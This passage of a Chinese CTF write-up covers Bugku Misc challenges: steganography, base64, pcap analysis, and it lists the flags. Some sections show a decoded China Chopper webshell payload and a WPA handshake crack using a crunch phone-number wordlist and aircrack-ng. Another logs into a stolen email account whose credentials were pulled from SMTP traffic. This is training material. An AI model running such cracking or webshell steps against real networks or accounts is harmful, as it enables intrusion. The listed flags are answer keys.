alt="1526005846765"></p><p>flag</p><blockquote><p>falg{NSCTF_e6532a34928a3d1dadd0b049d5a3cc57}</p></blockquote><h2 id="猜"><a href="#猜" class="headerlink" title="猜"></a>猜</h2><p>百度识图</p><p>flag</p><blockquote><p>key{liuyifei}</p></blockquote><h2 id="宽带信息泄露"><a href="#宽带信息泄露" class="headerlink" title="宽带信息泄露"></a>宽带信息泄露</h2><p>题目中给出一个conf.bin文件，主要是工具，用routerpassview打开，然后找到username<br>题目中给出了提示，flag是宽带用户名。</p><blockquote><p>flag{053700357621}</p></blockquote><h2 id="隐写2"><a href="#隐写2" class="headerlink" title="隐写2"></a>隐写2</h2><p>binwalk 分解得到 flag.rar 提示.jpg</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526007063925.png" alt="1526007063925"></p><p>压缩包解压需要密码，尝试了一下不是伪加密，使用ARCHPR爆破得到密码</p><p>解压得到3.jpg，UE发现3.jpg 文件尾后面有</p><blockquote><p>f1@g{eTB1IEFyZSBhIGhAY2tlciE=}</p></blockquote><p>把{}里base64解码一下，把f1@g 改为 flag</p><blockquote><p>flag{y0u Are a h@cker!}</p></blockquote><h2 id="多种方法解决"><a href="#多种方法解决" class="headerlink" title="多种方法解决"></a>多种方法解决</h2><p>UE打开是个base64之后的图片</p><p>base64转图片的网址：<a href="http://www.vgot.net/test/image2base64.php" target="_blank" rel="noopener">http://www.vgot.net/test/image2base64.php</a>?</p><p>注意base64转图片时，前面<code>data:image/jpg;base64,</code> 去掉</p><p>转了之后得到一张二维码</p><p>识别二维码：<a href="https://cli.im/deqr" target="_blank" rel="noopener">https://cli.im/deqr</a></p><blockquote><p>KEY{dca57f966e4e4e31fd5b15417da63269} </p></blockquote><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><p>解压，UE打开，发现很多都是00，直接搜索key</p><blockquote><p>key{feb81d3834e2423c9903f4755464060b}</p></blockquote><h2 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h2><p>追踪TCP流</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526009265898.png" alt="1526009265898"></p><p>base64解码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);if(PHP_VERSION&lt;&apos;5.3.0&apos;)&#123;@set_magic_quotes_runtime(0);&#125;;echo(&quot;X@Y&quot;);$F=&quot;C:\\wwwroot\\flag.tar.gz&quot;;$fp=@fopen($F,&apos;r&apos;);if(@fgetc($fp))&#123;@fclose($fp);@readfile($F);&#125;else&#123;echo(&apos;ERROR:// Can Not Read&apos;);&#125;;echo(&quot;X@Y&quot;);die();</span><br><span class="line">Ü</span><br></pre></td></tr></table></figure><p>发现</p><blockquote><p>flag.tar.gz</p></blockquote><p>提取出来解压得到flag.txt</p><blockquote><p>key{8769fe393f2b998fa6a11afe2bfcd65e}</p></blockquote><h2 id="这么多数据包"><a href="#这么多数据包" class="headerlink" title="这么多数据包"></a>这么多数据包</h2><p>根据提示要找getshell流，wireshark打开CTF.pcagng<br>先大致浏览一下，不难发现从第104个包开始应该是攻击机（192.168.116.138）在向目标机（192.168.116.159）进行端口扫描</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526036728234.png" alt="1526036728234"></p><p>追踪流——&gt;TCP可以看到其中有一个s4cr4t.txt的文件，base64解码得到flag<br>Q0NURntkb195b3VfbGlrZV9zbmlmZmVyfQ==</p><blockquote><p>CCTF{do_you_like_sniffer}</p></blockquote><h2 id="隐写3"><a href="#隐写3" class="headerlink" title="隐写3"></a>隐写3</h2><p>一看这图片就是被裁剪了，UE修改一下大小就看到flag了</p><blockquote><p>flag{He1l0_d4_ba1}</p></blockquote><h2 id="做个游戏-08067CTF"><a href="#做个游戏-08067CTF" class="headerlink" title="做个游戏(08067CTF)"></a>做个游戏(08067CTF)</h2><p>这里用Java Decompiler 工具反编译。</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526037823047.png" alt="1526037823047"></p><blockquote><p>flag{RGFqaURhbGlfSmlud2FuQ2hpamk=}</p></blockquote><blockquote><p>flag{DajiDali_JinwanChiji}</p></blockquote><h2 id="想蹭网先解开密码"><a href="#想蹭网先解开密码" class="headerlink" title="想蹭网先解开密码"></a>想蹭网先解开密码</h2><p>hint</p><blockquote><p>flag格式：flag{你破解的WiFi密码}</p><p>tips：密码为手机号，为了不为难你，大佬特地让我悄悄地把前七位告诉你<br>1391040<strong>\</strong><br>Goodluck!!</p><p>作者@NewBee</p></blockquote><p>提示WIFI密码为手机号。下载下来是一个cap包，用wireshark打开。WIFI连接认证的重点在WPA的四次握手包，<br>也就是eapol协议的包，过滤一下——</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526038800022.png" alt="1526038800022"></p><p>正好四个包，接下来就是破解密码了，因为已经给了11位手机号的前七位，使用crunch生成一个密码字典，然后<br>进行破解</p><p><a href="http://netsecurity.51cto.com/art/201706/541638.htm" target="_blank" rel="noopener">Linux密码生成工具crunch使用攻略</a></p><blockquote><p>crunch 11 11 -t 1391040%%%% &gt;&gt;wifipassword.txt</p></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526038848121.png" alt="1526038848121"></p><blockquote><p>aircrack-ng wifi.cap -w wifipassword.txt</p></blockquote><p>参数选择3 因为前两个为空</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526038909459.png" alt="1526038909459"></p><blockquote><p>KEY FOUND! [ 13910407686 ]</p></blockquote><p>可以用脚本写字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"1391040"</span></span><br><span class="line">t = <span class="string">""</span></span><br><span class="line">file = open(<span class="string">'data.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>): <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">t = s + str(i) + str(j) + str(k) + str(l) file.write(t)</span><br><span class="line">file.write(<span class="string">'\n'</span>)</span><br><span class="line">file.close()</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><h2 id="Linux2"><a href="#Linux2" class="headerlink" title="Linux2"></a>Linux2</h2><p>跟Linux1 一样，解压之后UE搜索</p><blockquote><p>KEY{24f3627a86fc740a7f36ee2c7a1c124a}</p></blockquote><h2 id="账号被盗了"><a href="#账号被盗了" class="headerlink" title="账号被盗了"></a>账号被盗了</h2><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526744297018.png" alt="1526744297018"></p><p>下载个CF外挂的exe</p><p>用wireshark抓包，exe账号密码随便写</p><p>然后过滤smtp，追踪TCP。圈起来的base64解码是163邮箱的账号和密码，登录找到flag</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526744401043.png" alt="1526744401043"></p><blockquote><p>flag{182100518+725593795416}</p></blockquote><h2 id="细心的大象"><a href="#细心的大象" class="headerlink" title="细心的大象"></a>细心的大象</h2><p>解压得到一张大象的图片</p><p>binwalk看一看发现后面有RAR</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526745078981.png" alt="1526745078981"></p><p>分解得到个加密的压缩包</p><p>查看大象的图片属性，备注有个字符串</p><blockquote><p>TVNEUzQ1NkFTRDEyM3p6</p></blockquote><p>base64解码</p><blockquote><p>MSDS456ASD123zz</p></blockquote><p>用这个去解密压缩包，得到2.jpg</p><p>修改一下图片大小看到flag</p><blockquote><p>BUGKU{a1e5aSA}</p></blockquote><h2 id="爆照-08067CTF"><a href="#爆照-08067CTF" class="headerlink" title="爆照(08067CTF)"></a>爆照(08067CTF)</h2><blockquote><p>flag格式 flag{xxx_xxx_xxx} </p></blockquote><p>binwalk一看有压缩包，但binwalk分解失败，用foremost分解得到一个zip</p><p>zip解压得到8张jpg和一张gif（直接解压出错，得用命令unzip解压）</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526746186205.png" alt="1526746186205"></p><p>88:二维码扫描得bilibili</p><p>888:复制到windows10，加上jpg，查看属性备注有字符串，base64解码得silisili</p><p>8888:binwalk发现有zip，解压得二维码，扫描得panama</p><blockquote><p>flag{bilibili_silisili_panama}</p></blockquote><h2 id="图穷匕见"><a href="#图穷匕见" class="headerlink" title="图穷匕见"></a>图穷匕见</h2><p>查看属性</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526748648784.png" alt="1526748648784"></p><p>UE查看，jpg FF D9文件尾后面还有很多数字</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526748762224.png" alt="1526748762224"></p><p>提取出来，用notepad++的Converter <strong>16进制-&gt;ASCII</strong>方式解码 </p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526748823481.png" alt="1526748823481"></p><p>这是坐标的形式</p><p>这时候再结合<strong>会画图吗</strong>的提示，将这些坐标做成一张图即可，用<strong>gnuplot</strong>这个工具比较方便，因此将坐标转为gnuplot能识别的格式 <strong>坐标1 坐标2</strong> </p><blockquote><p>kali安装gnuplot：sudo apt-get install gnuplot-x11<br>plot “/root/Desktop/111.txt”<br>但windows下是使用 plot “C:\Users\Asus\Desktop\111.txt”</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/Bugku# gnuplot</span><br><span class="line">gnuplot&gt; plot &quot;paintpaintpaint.txt&quot;</span><br><span class="line">注意调整一下比例，弄得高一点就可以扫描成功</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526748891397.png" alt="1526748891397"></p><blockquote><p>flag{40fc0a979f759c8892f4dc045e28b820}  </p></blockquote><p>参考：<a href="https://www.cnblogs.com/WangAoBo/p/6950547.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/6950547.html</a></p><h2 id="convert"><a href="#convert" class="headerlink" title="convert"></a>convert</h2><p>题目给了一串二进制字符，转为16进制 ,52617221是RAR的文件头，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">526172211A0700CF907300000D00000000000000F7C07420902C000D09000059220000023E6370190A59B34A1D330700200000006B65792E6A706700F014A319101D911508917C9015EACB02ECD08228A0B868B4D082A05DB62880816089A944DAA0A0DA68B3426CB02CC44D29A1445404474882209A501D06C5411514313101044D5DC6C050B5440C14B4103B1607446C0E0F71EB11DF1CCEF7C33C4FB91313C999FAA7EE4C473C262BF989D1F54CCD4E88FA3F7EA9F0A88A8A8A889AAAF09889C7F463FEC0D2ADABAD2B8036580DF85E031FD3A5AC567C6F6DCC2B8B80D783281200F0CDE031C943050297464341E070CBB4AD050F80202966E146372501F14FB13A3E058B645BF47C0B162D91A06FC683C257B22568F8162C5B23EBA3E058B64559980E407C03704F4B03C01EC0B806502B0090374599029F99C6854DC72570C946017729FF72D881BC03EFD8CAB0565CCFB702A04F5D0A7E63E0E4AFA170B9045DCC2E794424FE3E30072AB02B2A312EB0278A20D692E0EAD84053D6C52860A4722F0DEE798D696D6052DAF2B7D07A4C1BAE4814D6D8DA3C8F05E453B111FC16F79246A1748B09B66E7979754F162DCDE1287B5BA701B129A9D1C85BE0F751615A05814073E3A8F6A716C2F3FAC90CD45451BDF494A8C29BDAF3032ECD7062E3AAAB63737ACBEBBB630BEEE989A9F5C5A939AD18729690D541F13DF1C9D5C8BD878AFA7C1CD6B32A8A17DAFC9E17BE84E1684A4A0EED6DA9EC1B757FE0A850971FF1F18F796253DA5A53A3B90CE153B24163068B1A352422A92F049CCBF1F124BBD0D085E6822FFE2404AE2BFB01A3E4058B6473FB8D1F202C58B647AFFEC83F1A55B63985A497B0B48AC7B402A804999988333212232C3434126A6E77A437363637D569B4E72767FAB4140CBCF8F852225230A424843CC28FB4D7240CD8ECB2841464E514D1AA09497B21BA16018D3242F6373DD2690F46EB0FB5837267E3D300E84816415A1C32100C0E8307CBB1FC00410BA930C836547DF63D0C601CC4CB3B012686A6C1149ED29761758730310E646462621557E0AB80C4E8CB4DACD8AA19E9D7C78842763B1B0315D31287B6EC77B50C15B7C8897C077822FCD49E1EEAB568BAD4647D76BF65B34CDA26A727AAEDD595D6165696D85898D919777BC666A0B60D20DCDEE0F0F245E9EDF093EC1F1212161A1F8BC68B8CE5C6F323B9BCEE7C97524E53AB2B2D2F31D9ED4ECF4FD050D151D3F7FC1E1A8F178EA6AABBCD5F61E7B1F45959FA49DC5CDD7ABD7777852FF03F7C1F87C708AFCB0F4319CF38386FB8CADE7590E7AB9EB1888CAC6627BD028745C39EB19E99517C40F76D3A1161277B6CF672434434B60BED416ADCF551365E945BFD0C6FFD47F4F1A82C9EBC9CFE319B301B87C90C0EB3A700E06161A3C9401AFFFACD54751096D052D73DA3E0CBB3892562899A55DF576FF9526B3D394B3E1DFA8CB07A5D5E372FC8A74B070B691F71AAC3B099FCED19FAA473A9E43074532A0420C6BBA969AB27717714D58ACECE713EBF7A47A3D7B58711832DF30DD55C9469F63D76B61C28B42854385C4AF0D656CD0CF64ADEAB5F2456B5DA8BF532648CDED71312D18C6471491C949C814B28D6F971BAA1AFC16E9A9A2641B63C359A5CE909A258E0F01B26E0E2B455576A2CE2B799D7A94D29A04D91EE242239BA489B6B358717FFBB541F1BBA277E25384729C6A922755EC140C87BC18A4A2D5CF799A9D182528B5053985192CD147C1694C071A8265DBAD793F187A43B9045DEC6401C61F62F3D33DE514D4E21A536D6A12DA085F8DB7472256E625EA77B1757F6B61206FBC6F3C5237A27EDE29AB48382CA960458CD8AC9CAE4F76E7FB911573FCE45E4A6DAC321ECFCAF921507455CEF6DC44F37F1266935EEDC86EBEE9422647FA7D9106D24C4B49637B3B445593D4E9B17E24F45858A3E1D7984F7B48B7EB0E777ACFBBDC470F61EEF569ED1586C118C39F07B4CD32249BF9D4E42FB87C7C8A592E4D002E0F9976B7D88BCB33BB0A995A48B27BBEEB51AC7F921D3F7FC32313713876DF87751BDB4CE1BD5CC63C12E2D04F01F5A2325F5B3528A9C2875F6CDEFB9456136630F0A1D2540737471E2A7A36AE4C6A95336D34EA432BA6B0620FC6B6C6A320EB5EB854489852657AAF12965158E05139C09136E2DFEAE9D8ED9024385EC292F14BBF54848621F414EAD571B16C1F9029FE3EBA6D4CAEE3A2CF6D2CDAC075BAC65D1085C9D2159FB76725EE23D33B3C9F918E20BDB481C56E30A62B08D6B221729503198C8B2506C4B8161DB52F4B23468C71E256FC12597C2802894D20FB68F6E93E3CFBBCBEEF19471AC01A8C910D77AE8029FF7FD35F66FC81515A568FDEEB51ED1986CB42CA83703843FBA4C6F99BB32972D47AE7C8514730FF1005C972B9D7FA103975DB6D198F311A2AB4FF55E6F780920B3139D5526A283DFFD2552B9712EDF946C4C444D0A3272366E3F9F7E8D139FBD4BAB222FA0FCF38CD77A9E43AE82B60B59C145640B21EC9A7E1EDA5C3D3B2CE58F34AD2D3DB8AB1237895253D0F4D30870FF298345FF2A72949D76FDE471C0EB9DD436351D4FCFD93536CFDED5B6CBF52F06EECA0C9370E433214DFE49DECE8B2B0EE4E75A57A99A8EB291D30EE98B0624E3DEC97DCDE656F3ACCDBAFB9432B0C7D8DA8A2B8166EE367F1ECB6D04FF1ED2A291A949C209FD2D9D48CAB7E1BE38AE2762BD028713D07D1B43C05D953B8029D4B5E64BE045D541DD617896EFD04F3C3D65A9951BD9970BE34E2E046C3A6AFD63AB8DB6C3F5EEA3DA55E70DCD927B0746377A4E14C87066EC39B8F9A49FD19A8BB1D24825447AA0ECCB8C8FE1D5DE3D71E5A479CFB03ED70C37C827439BBA3E0B037E76132A670570C3DDAB3BDBA55F9BF750E76084BCCCD0EE5D2863B7BEBE302F540F0C5629DE8C7C19E012F1517587719FF00DFB59EECDC37C98F7C22A1724EEE7FCE36EEC62D414E0AA861CA760CB76DA65AA49B49CF79467A26AB64C04D66C8E1950E0D4CFD760DB7907266CDB8D871227511096800A99B11E0305D3C71A0D3B779D17A90833005FE57F6F35699EBAD7A7A0FC8188BB5F010F1F507501F3F3D446939ADA2BF6B533EFA7F8028A3D3BF8AD6B0CE3A03E0E3B08F3F48428767B5B4E3AD1D7EDD8BDB0B1B1E6A64E49E730E512CC7E8CC305709CE8903D9CA6C3B75B3D2C4665B79E8F290F2FDF449982D740CAAB1DAF06FE565C6C64C4AA39AF619691338D643DD789C1428CAAE4E2447C986EFEA0497F365767FD7A60A3DB3A152AFC3470DD2627FB569FAF6BC75E8BBA5D9280D55D2C62F87E72FB698C5B00F77AEAFFE74DFE8308C7B2FF28C43D7B00400700</span><br></pre></td></tr></table></figure><p>把这16进制串写入RAR，解压得到一张图片</p><p>查看图片属性，发现base64，解码</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526781473383.png" alt="1526781473383"></p><blockquote><p>flag{01a25ea3fd6349c6e635a1d0196e75fb}</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/5/20 9:44</span></span><br><span class="line"><span class="comment"># @Author  : Lhaihai</span></span><br><span class="line"><span class="comment"># @File    : 多种进制转换.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    : http://blog.Lhaihai.wang</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Description :</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">__author__ = <span class="string">'Mang0'</span></span><br><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">base = [str(x) <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>)] + [chr(x) <span class="keyword">for</span> x <span class="keyword">in</span> range(ord(<span class="string">'A'</span>), ord(<span class="string">'A'</span>) + <span class="number">6</span>)]</span><br><span class="line"><span class="comment"># bin2dec</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin2dec</span><span class="params">(string_num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str(int(string_num, <span class="number">2</span>))</span><br><span class="line"><span class="comment"># hex2dec</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex2dec</span><span class="params">(string_num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str(int(string_num.upper(), <span class="number">16</span>))</span><br><span class="line"><span class="comment"># dec2bin</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec2bin</span><span class="params">(string_num)</span>:</span></span><br><span class="line">    num = int(string_num)</span><br><span class="line">    mid = []</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        num, rem = divmod(num, <span class="number">2</span>)</span><br><span class="line">        mid.append(base[rem])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([str(x) <span class="keyword">for</span> x <span class="keyword">in</span> mid[::<span class="number">-1</span>]])</span><br><span class="line"><span class="comment"># dec2hex</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec2hex</span><span class="params">(string_num)</span>:</span></span><br><span class="line">    num = int(string_num)</span><br><span class="line">    mid = []</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        num, rem = divmod(num, <span class="number">16</span>)</span><br><span class="line">        mid.append(base[rem])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([str(x) <span class="keyword">for</span> x <span class="keyword">in</span> mid[::<span class="number">-1</span>]])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># hex2tobin</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex2bin</span><span class="params">(string_num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span>  dec2bin(hex2dec(string_num.upper()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># bin2hex</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin2hex</span><span class="params">(string_num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> dec2hex(bin2dec(string_num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    file1 = open(<span class="string">r'E:\CTF\misc\Bugku\1.txt'</span>)</span><br><span class="line">    s = file1.read()</span><br><span class="line">    hexx = bin2hex(s)</span><br><span class="line">    <span class="keyword">print</span> (hexx)</span><br><span class="line">    file2 = open(<span class="string">r'E:\CTF\misc\Bugku\cover.rar'</span>, <span class="string">'wb'</span>)</span><br><span class="line">    file2.write(binascii.a2b_hex(hexx))</span><br></pre></td></tr></table></figure><h2 id="听首音乐"><a href="#听首音乐" class="headerlink" title="听首音乐"></a>听首音乐</h2><p> 解压有个wav的音频</p><p>用Audacity打开，，发现上面有一串点横，联想到摩斯密码</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526783809280.png" alt="1526783809280"></p><blockquote><p>····· -··· -·-· —-· ··— ····· -···· ····- —-· -·-· -··· —– ·—- —·· —·· ··-· ····· ··— · -···· ·—- –··· -·· –··· —– —-· ··— —-· ·—- —-· ·—- -·-·</p></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526783875098.png" alt="1526783875098"></p><p>注意要把小写字母转为大写</p><blockquote><p>5BC925649CB0188F52E617D70929191C</p></blockquote><h2 id="好多数值"><a href="#好多数值" class="headerlink" title="好多数值"></a>好多数值</h2><blockquote><p>flag格式 flag{} </p></blockquote><p>下载打开一看，RGB，图片大小不知道大佬们怎么测试出来的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/5/12 0:42</span></span><br><span class="line"><span class="comment"># @Author  : Lhaihai</span></span><br><span class="line"><span class="comment"># @File    : RGB转jpg.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    : http://blog.Lhaihai.wang</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Description : </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">x = <span class="number">503</span> <span class="comment">#x坐标  通过对txt里的行数进行整数分解</span></span><br><span class="line">y = <span class="number">122</span> <span class="comment">#y坐标  x*y = 行数</span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">"RGB"</span>,(x,y))<span class="comment">#创建图片</span></span><br><span class="line">file = open(<span class="string">r'E:\CTF\misc\Bugku\1 (1).txt'</span>) <span class="comment">#打开rbg值文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过一个个rgb点生成图片</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,y):</span><br><span class="line">        line = file.readline()<span class="comment">#获取一行</span></span><br><span class="line">        rgb = line.split(<span class="string">","</span>)<span class="comment">#分离rgb</span></span><br><span class="line">        im.putpixel((i,j),(int(rgb[<span class="number">0</span>]),int(rgb[<span class="number">1</span>]),int(rgb[<span class="number">2</span>])))<span class="comment">#rgb转化为像素</span></span><br><span class="line">im.show()</span><br><span class="line"><span class="comment"># im.save('qqq.jpg')</span></span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526785102381.png" alt="1526785102381"></p><blockquote><p>flag{youc@n’tseeme}</p></blockquote><h2 id="很普通的数独-ISCCCTF"><a href="#很普通的数独-ISCCCTF" class="headerlink" title="很普通的数独(ISCCCTF)"></a>很普通的数独(ISCCCTF)</h2><p>UE查看，开头是50 4B 03 04 ，zip的文件头</p><p>加上zip后缀，解压出一丢图片</p><p>iscc的脑洞题，不想做了，放下表哥的writeup</p><p><a href="http://blog.chrstm.com/2017/05/29/ISCC2017/" target="_blank" rel="noopener">http://blog.chrstm.com/2017/05/29/ISCC2017/</a></p><p><a href="http://isron.cn/2017/05/24/ISCC-shudu/" target="_blank" rel="noopener">http://isron.cn/2017/05/24/ISCC-shudu/</a></p><blockquote><p>flag{y0ud1any1s1}</p></blockquote><h2 id="好多压缩包"><a href="#好多压缩包" class="headerlink" 